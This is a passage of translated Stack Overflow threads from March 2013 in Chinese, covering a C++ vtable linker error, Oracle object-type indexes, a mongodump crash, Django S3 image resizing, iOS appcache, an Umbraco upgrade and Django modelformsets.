            cout<<"\nYour row # is "<<rowNum<<" and you choosed seat # "<<seatNum;

                    seatsThHo[rowNum][seatNum] = RESERVED;
            }       
            break;
        case 2:
            {
            cout<<"\nYou wanted to buy ticket from the movie 'Rise Of The Guardians': ";
            cout<<"\nYour row # is "<<rowNum<<" and you choosed seat # "<<seatNum;

                    seatsROG[rowNum][seatNum] = RESERVED;
            }
            break;
        case 3:
            {
            cout<<"\nYou wanted to buy ticket from the movie 'Hotel Transylvania': ";
            cout<<"\nYour row # is "<<rowNum<<" and you choosed seat # "<<seatNum;

                    seatsHoTr[rowNum][seatNum] = RESERVED;
            }
            break;
        case 0:

            break;
        }
}

void Movies::availableSeats()
{
    switch(chosenMovie)
    {
        case 1:
            {
            cout<<"\nAvailable Seats for the movie 'Rise Of The Guardians': ";

                    for(int x=0; x<10; x++)
                                {
                        for(int y=0; y<10; y++)
                                {

                                    cout<<seatsThHo[x][y]<<"  ";

                                }
                                }

            }       
            break;
        case 2:
            {
            cout<<"\nAvailable Seats for the movie 'Rise Of The Guardians': ";

                    for(int x=0; x<10; x++)
                                {
                        for(int y=0; y<10; y++)
                                {

                                    cout<<seatsROG[x][y]<<"  ";

                                }
                                }

            }
            break;
        case 3:
            {
            cout<<"\nAvailable Seats for the movie 'Hotel Transylvania': ";

                    for(int x=0; x<10; x++)
                                {
                        for(int y=0; y<10; y++)
                                {

                                    cout<<seatsHoTr[x][y]<<"  ";

                                }
                                }

            }
            break;
        case 0:

            break;
        }
} 
```

错误：

```
[Linker error] main.o:main.cpp:(.text$_ZN7MachineC2Ev[Machine::Machine()]+0x8): undefined reference to `vtable for Machine'

[Linker error] main.o:main.cpp:(.text$_ZN7MachineC1Ev[Machine::Machine()]+0x8): undefined reference to `vtable for Machine' 

collect2: ld returned 1 e xit status

 C:\Users\Mary Grace\Desktop\Theater Reservation Program\Makefile.win [Error] [TheaterProject.exe] Error 1 (if this is the only error: please check your library includes) 
```

我真的不知道现在该怎么办，我已经为这个 prog 工作了大约 3 个小时。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:02:32.480

该文件`imp.cpp`只是`header.h`. 源文件应该包含头文件中方法的*实现*。

像

```
void Machine::menu()
{
    // Code for this method
} 
```

等等。

* * *

您遇到的问题是因为您的类中没有构造函数或析构函数。包含虚函数的类还必须实现构造函数和（虚）析构函数。不必包含任何内容并且可以为空，只需定义即可。

错误消息中有一个提示：

```
[Linker error] main.o:main.cpp:(.text$_ZN7MachineC2Ev[Machine::Machine()]+0x8): undefined reference to `vtable for Machine'

Here -------------------------------------------------^^^^^^^^^^^^^^^^ 
```

实现构造函数和析构函数，它应该可以工作。

由于构造函数和析构函数可以为空，我建议您只需将它们添加到头文件中的类定义中：

```
class Machine
    {
        public:
            Machine() {}  // Constructor with empty body
            virtual ~Machine() {}  // Empty virtual destructor

            // Rest of the class...
    }; 
```

对其他类执行相同的操作，但当然要使用正确的名称。

# sql - 如何在类型对象上创建索引？

> ID：15154982
> 
> 赞同：3
> 
> 时间：2013-03-01T10:00:03.813
> 
> 标签：sql, oracle, plsql, oracle11g

目前我正在使用 oracle 11g 中的类型对象。在这我有如下数据库对象：

1.  桌子

    ```
    CREATE TABLE students
      (rollno NUMBER(15) primary key, s_Name VARCHAR2(20), Marks type_1
      ); 
    ```

2.  类型对象规范是

    ```
    CREATE OR REPLACE type type_1
    AS
      object
      (
        sub_1 NUMBER,
        sub_2 NUMBER,
        sub_3 NUMBER,
        member FUNCTION total
        RETURN NUMBER,
        member FUNCTION e_result
        RETURN VARCHAR2); 
    ```

3.  是身体

    ```
    CREATE OR REPLACE type body type_1
    AS
      member FUNCTION total
      RETURN NUMBER
    IS
    BEGIN
      RETURN (sub_1+sub_2+sub_3);
    END;
    member FUNCTION e_result
      RETURN VARCHAR2
    IS
      DECLARE
        temp NUMBER;
      BEGIN
        temp  :=sub_1+sub_2+sub_3;
        IF(temp>50) THEN
          RETURN ('pass');
        ELSE
          RETURN ('fail');
        END IF;
      END;
    END; 
    ```

在创建所有这些东西之后，即使我已经成功地使用填充了学生表

```
BEGIN
FOR i IN 1..800 LOOP
        FOR j IN 1..400 LOOP
INSERT INTO students
VALUES     (sequence1.NEXTVAL,
            dbms_random.String('A', 5),
            Type_1(Round(dbms_random.Value(10, 100)), Round(
            dbms_random.Value(10, 100)), Round(dbms_random.Value(10, 100))));
END LOOP;
END LOOP;

dbms_output.Put_line('completed');

COMMIT;
END;

/ 
```

我需要在列上创建位图索引，在`e_result`列上创建普通索引`tot`。

我试过了

```
create index id1 on students(marks.total) 
```

和

```
create bitmap index bid1 on students(marks.e-result) 
```

但我不能。我应该做些什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T10:32:47.747

首先，您必须声明您的函数，`DETERMINISTIC`以便在 SQL 索引中使用它们（即，您必须向 Oracle 断言，给定相同的输入，它们给出相同的输出）。

例如：

```
SQL> CREATE OR REPLACE type type_1
  2  AS
  3    object
  4    (
  5      sub_1 NUMBER,
  6      sub_2 NUMBER,
  7      sub_3 NUMBER,
  8      member FUNCTION total
  9      RETURN NUMBER deterministic,
 10      member FUNCTION e_result
 11      RETURN VARCHAR2 deterministic
 12  );
 13  /

Type created.

SQL> CREATE OR REPLACE type body type_1
  2  AS
  3    member FUNCTION total
  4    RETURN NUMBER deterministic
  5  IS
  6  BEGIN
  7    RETURN (sub_1+sub_2+sub_3);
  8  END;
  9  member FUNCTION e_result
 10    RETURN VARCHAR2 deterministic
 11  IS
 12      temp NUMBER;
 13    BEGIN
 14      temp  :=sub_1+sub_2+sub_3;
 15      IF(temp>50) THEN
 16        RETURN ('pass');
 17      ELSE
 18        RETURN ('fail');
 19      END IF;
 20    END;
 21  END;
 22  / 
```

其次，您必须`()`在调用函数时使用，否则它将假定它是一个名为的列`total`：

```
SQL> create index id1 on students (marks.total());

Index created.

SQL> create bitmap index bid1 on students(marks.e_result());

Index created. 
```

那么你应该看到使用的索引：

```
SQL> exec dbms_stats.gather_table_stats(user, 'STUDENTS', method_opt=>'for all indexed columns size skewonly')

PL/SQL procedure successfully completed.

SQL> explain plan for select * from students s where s.marks.e_result() = 'fail';

Explained.

SQL> @explain ""

Plan hash value: 1595221732

-----------------------------------------------------------------------------------------
| Id  | Operation                    | Name     | Rows  | Bytes | Cost (%CPU)| Time     |
-----------------------------------------------------------------------------------------
|   0 | SELECT STATEMENT             |          |   635 | 17780 |   109   (0)| 00:00:02 |
|   1 |  TABLE ACCESS BY INDEX ROWID | STUDENTS |   635 | 17780 |   109   (0)| 00:00:02 |
|   2 |   BITMAP CONVERSION TO ROWIDS|          |       |       |            |          |
|*  3 |    BITMAP INDEX SINGLE VALUE | BID1     |       |       |            |          |
----------------------------------------------------------------------------------------- 
```

# mongodb - Mongo 导入/转储不适用于副本集

> ID：15154986
> 
> 赞同：0
> 
> 时间：2013-03-01T10:00:23.697
> 
> 标签：mongodb, mongodump

我在备份副本集时遇到问题`mongodump`。`mongoexport`只是出于好奇验证了同样的问题。

这是我的设置：

*   mongodb-linux-x86_64-static-legacy-2.2.0
*   3个节点副本集（截至目前健康）

> ```
> PRIMARY> rs.status() {
>         "set" : "eu-int",
>         "date" : ISODate("2013-03-01T09:54:06Z"),
>         "myState" : 1,
>         "members" : [
>                 {
>                         "_id" : 0,
>                         "name" : "ldnpsr1971:27017",
>                         "health" : 1,
>                         "state" : 1,
>                         "stateStr" : "PRIMARY",
>                         "uptime" : 26646,
>                         "optime" : {
>                                 "t" : 1362131645000,
>                                 "i" : 11
>                         },
>                         "optimeDate" : ISODate("2013-03-01T09:54:05Z"),
>                         "maintenanceMode" : -1,
>                         "self" : true
>                 },
>                 {
>                         "_id" : 1,
>                         "name" : "ldnpsr1723:27017",
>                         "health" : 1,
>                         "state" : 2,
>                         "stateStr" : "SECONDARY",
>                         "uptime" : 26646,
>                         "optime" : {
>                                 "t" : 1362131645000,
>                                 "i" : 8
>                         },
>                         "optimeDate" : ISODate("2013-03-01T09:54:05Z"),
>                         "lastHeartbeat" : ISODate("2013-03-01T09:54:05Z"),
>                         "pingMs" : 0
>                 },
>                 {
>                         "_id" : 2,
>                         "name" : "ldnpsr2114:27017",
>                         "health" : 1,
>                         "state" : 2,
>                         "stateStr" : "SECONDARY",
>                         "uptime" : 26641,
>                         "optime" : {
>                                 "t" : 1362131645000,
>                                 "i" : 11
>                         },
>                         "optimeDate" : ISODate("2013-03-01T09:54:05Z"),
>                         "lastHeartbeat" : ISODate("2013-03-01T09:54:06Z"),
>                         "pingMs" : 0
>                 }
>         ],
>         "ok" : 1 } 
> ```

现在我正在导出：

```
~/mongo/bin/mongodump --host "eu-int/ldnpsr1971:27017,ldnpsr1723:27017,ldnpsr2114:27017" --db msgstore --collection forJames --out ~/data/mongo-backup/eu-int/20130301 
```

死于：

```
Fri Mar  1 09:55:55 starting new replica set monitor for replica set eu-int with seed of ldnpsr1971:27017,ldnpsr1723:27017,ldnpsr2114:27017
Fri Mar  1 09:55:55 successfully connected to seed ldnpsr1971:27017 for replica set eu-int
Fri Mar  1 09:55:55 changing hosts to { 0: "ldnpsr1971:27017", 1: "ldnpsr2114:27017", 2: "ldnpsr1723:27017" } from eu-int/
Fri Mar  1 09:55:55 trying to add new host ldnpsr1723:27017 to replica set eu-int
Fri Mar  1 09:55:55 successfully connected to new host ldnpsr1723:27017 in replica set eu-int
Fri Mar  1 09:55:55 trying to add new host ldnpsr1971:27017 to replica set eu-int
Fri Mar  1 09:55:55 successfully connected to new host ldnpsr1971:27017 in replica set eu-int
Fri Mar  1 09:55:55 trying to add new host ldnpsr2114:27017 to replica set eu-int
Fri Mar  1 09:55:55 successfully connected to new host ldnpsr2114:27017 in replica set eu-int
Fri Mar  1 09:55:55 Primary for replica set eu-int changed to ldnpsr1971:27017
Fri Mar  1 09:55:55 replica set monitor for replica set eu-int started, address is eu-int/ldnpsr1723:27017,ldnpsr1971:27017,ldnpsr2114:27017
Fri Mar  1 09:55:55 [ReplicaSetMonitorWatcher] starting
connected to: eu-int/ldnpsr1971:27017,ldnpsr1723:27017,ldnpsr2114:27017
Fri Mar  1 09:55:55 DATABASE: msgstore   to     /home/ldnlmxi/data/mongo-backup/eu-int/20130301/msgstore
Illegal instruction (core dumped) 
```

仅指定单个节点（副本集的 PRIMARY 节点）执行相同的命令会成功创建转储。

请问有人知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T13:52:06.330

您遇到了 MongoDB 错误[https://jira.mongodb.org/browse/SERVER-7006](https://jira.mongodb.org/browse/SERVER-7006)，该错误发生在 2.2.0 中，但在 2.2.3（最新生产版本）中已修复。

升级应该可以解决问题。

# django - 使用 S3 读取文件时出现 Django PIL 错误

> ID：15154989
> 
> 赞同：1
> 
> 时间：2013-03-01T10:00:32.213
> 
> 标签：django, django-models

Django新手:)

我通过包[django-storages使用](http://django-storages.readthedocs.org/en/latest/)**S3 存储**。当我通过管理员上传/更新新图像时，这似乎很完美。

**models.py**（图像字段）

```
 image = models.ImageField(
        upload_to=path_and_rename("profiles"),
        height_field="image_height",
        width_field="image_width",
        null=True,
        blank=True,
        editable=True,
        help_text="Profile Picture",
        verbose_name="Profile Picture"
    )
    image_height = models.PositiveIntegerField(null=True, blank=True, editable=False, default="100")
    image_width = models.PositiveIntegerField(null=True, blank=True, editable=False, default="100") 
```

然后我决定我想在上传时调整图像大小，所以尝试在保存覆盖方法中添加以下代码......

```
def save(self, *args, **kwargs):

        if not self.id and not self.image:
            return

        super(Profile, self).save(*args, **kwargs)

        image = Image.open(self.image).seek(0)
        (width, height) = image.size
        size = ( 100, 100)
        image = image.resize(size, Image.ANTIALIAS)
        image.save(self.image.path) 
```

这是问题所在，这给出了以下错误....

**无法识别图像文件**

然后我昨天在堆栈上发布了一个问题*（我删除了）*，并且一个用户链接到这个答案[Django PIL：IOError Cannot identify image file](https://stackoverflow.com/questions/9950745/django-pil-ioerror-cannot-identify-image-file) which I sorta understand（因为图像尚未上传，它还无法读取）。**但我不确定这是我的问题！**当我收到错误**无法识别图像文件**时，我可以看到原始文件实际上已上传到 S3 *（当然没有调整大小）*。

**记住我是新手**，任何人都可以修改我的示例保存方法*（并解释）*以解决此问题吗？即一种在上传时将新图像调整为 100x100 的方法？

非常感谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T11:06:26.990

如果文件已经写入，则使用存储读取文件，然后调整大小....

```
def save(self, *args, **kwargs):
        if not self.id and not self.image:
            return

        super(Profile, self).save(*args, **kwargs)

        import urllib2 as urllib
        from cStringIO import StringIO
        from django.core.files.uploadedfile import SimpleUploadedFile

        '''Open original photo which we want to resize using PIL's Image object'''
        img_file = urllib.urlopen(self.image.url)
        im = StringIO(img_file.read())
        resized_image = Image.open(im)

        '''Convert to RGB if necessary'''
        if resized_image.mode not in ('L', 'RGB'):
            resized_image = resized_image.convert('RGB')

        '''We use our PIL Image object to create the resized image, which already
        has a thumbnail() convenicne method that constrains proportions.
        Additionally, we use Image.ANTIALIAS to make the image look better.
        Without antialiasing the image pattern artificats may reulst.'''
        resized_image.thumbnail((100,100), Image.ANTIALIAS)

        '''Save the resized image'''
        temp_handle = StringIO()
        resized_image.save(temp_handle, 'jpeg')
        temp_handle.seek(0)

        ''' Save to the image field'''
        suf = SimpleUploadedFile(os.path.split(self.image.name)[-1].split('.')[0],
                                 temp_handle.read(), content_type='image/jpeg')
        self.image.save('%s.jpg' % suf.name, suf, save=True) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T10:16:00.737

如果你期望

```
image.save(self.image.path) 
```

去工作。你不应该打开它

```
image = Image.open(self.image.path).seek(0) 
```

?

# iphone - iOS appcache突然被忽略

> ID：15154992
> 
> 赞同：0
> 
> 时间：2013-03-01T10:00:37.667
> 
> 标签：iphone, ios, ipad, safari, mobile-safari

我的任务是为一本杂志构建一个网络应用程序，该应用程序将显示给使用 iPad 的人。鼓励用户将其保存到他们的主屏幕，并且它被设计为在离线时可用。

我认为它工作正常，但客户注意到一个问题：几分钟后，关闭并重新打开应用程序，缓存重置，它不会加载各种资产。一些 HTML 和 CSS 出现了，但是当我通过 Safari 调试工具进行检查时，它抱怨它无法访问各种图像、一些 javascript 和 - 有趣的是 - appcache 文件本身。

有谁知道是什么导致 iOS/Safari 突然忽略了我的 appcache，或者至少是其中的一部分？

# .net - 从 6.0.0 升级到 6.0.1，然后 Umbraco 回到 6.0.0

> ID：15154993
> 
> 赞同：1
> 
> 时间：2013-03-01T10:00:43.413
> 
> 标签：.net, umbraco, upgrade, patch

我在将 6.0.0 修补到 6.0.1 时遇到问题。我正在复制所有文件（我没有更改任何配置文件）按应有的方式安装。当我在安装后来到后台时，我可以确认它是 6.0.1 版本。但在配置文件中，它仍然显示 6.0.0，当我尝试运行该站点时，它会迫使我一遍又一遍地进行安装。

如果我删除配置文件中的 6.0.0 值，我会强制 Umbraco 将其设置为 6.0.1，对于一页请求来说一切正常。此后，它会强制进行新安装并返回到 6.0.0。（我可以通过版本号和排序功能来确认，其中复制的节点在排序时会留下旧的节点名称。）

这是一个错误还是我做错了什么？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T03:50:09.510

安装程序应该更新 web.config 以显示正在使用的版本。安装程序是否具有对 web.config 的写入权限？如果没有，您应该能够手动将 web.config 文件编辑为 6.0.1，这样它就不会一直尝试运行安装程序。

# django - django modelformset 创建一个对象

> ID：15154995
> 
> 赞同：0
> 
> 时间：2013-03-01T10:00:48.773
> 
> 标签：django, django-models

我正在创建一个允许匿名输入数据的应用程序，并将我的困难浓缩为一个简单的作者示例。

我的问题是每次输入一个新作者，提交后呈现的表单数量增加了N+1个作者。（即第一次使用，有1个表格，然后是2个，然后是3个）。我只希望显示一个空白表格，然后稍后将使用其他应用程序来检索数据。

似乎有两种方法可以解决这个问题。1）获取 formset.management_form 以返回最后一个表单（例如切片：'{% for form in formset[-1] %}'，这不起作用。2）让 view.py 只发送一个新表单而不是render_to_response() 中的表单集 - 怎么做？

---models.py---

```
from django.db import models
from django.forms import ModelForm

class Author(models.Model):
    first_name = models.CharField(max_length=50)

class AuthorForm(ModelForm):
    class Meta:
        model = Author 
```

---/models.py---

---views.py---

```
django.http import HttpResponseRedirect
from django.shortcuts import render_to_response
from django.template import RequestContext
from django.forms.models import modelformset_factory
from author.models import Author , AuthorForm

def manage_authors(request):
    AuthorFormSet = modelformset_factory(Author)
    if request.method == 'POST':
    formset = AuthorFormSet(request.POST)
    if formset.is_valid():
            formset.save()
    else:
        formset = AuthorFormSet()
    return render_to_response("manage_authors.html",{"formset": formset,}) 
```

---/views.py---

---manage_authors.html---

```
<!DOCTYPE html>
<html lang="en"
      <body>
        <form action="" method="post">
          <table>
            {{ formset.management_form }}
            {% for form in formset %}
            {{ form }}
            {% endfor %}
          </table>
          <button type="submit">Submit</button>
        </form>
      </body>
</html> 
```

---/manage_authors.html---

---urls.py---

```
from django.conf.urls import patterns, include, url
from author.views import manage_authors
urlpatterns = patterns('',
    url(r"^author/$", manage_authors),
) 
```

---/urls.py---

更新：感谢使用 modelform 的建议。django 文档只显示了与 modelformset 的模板交互。使用：

---views.py---

```
def manage_authors(request):
    form = AuthorForm(request.POST)
    if request.method == 'POST':
        if form.is_valid():
            form.save()
    else:
        form = AuthorForm()
    return render_to_response("manage_authors.html",{"form": form,}) 
```

---/views.py

并且仅在 manage_authors.html 中使用标签 {{ form }} 即可满足我的需要。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T10:30:04.473

在创建模型表单集时尝试使用[`max_num`和`extra`](https://docs.djangoproject.com/en/dev/topics/forms/modelforms/#limiting-the-number-of-editable-objects)字段

```
AuthorFormSet = modelformset_factory(Author, max_num=1, extra=1) 
```

如果不存在，这将尝试最多显示 1 个表单。

但是，您可能想考虑是否真的必须按照*@Daniel Roseman*的建议使用 modelformset。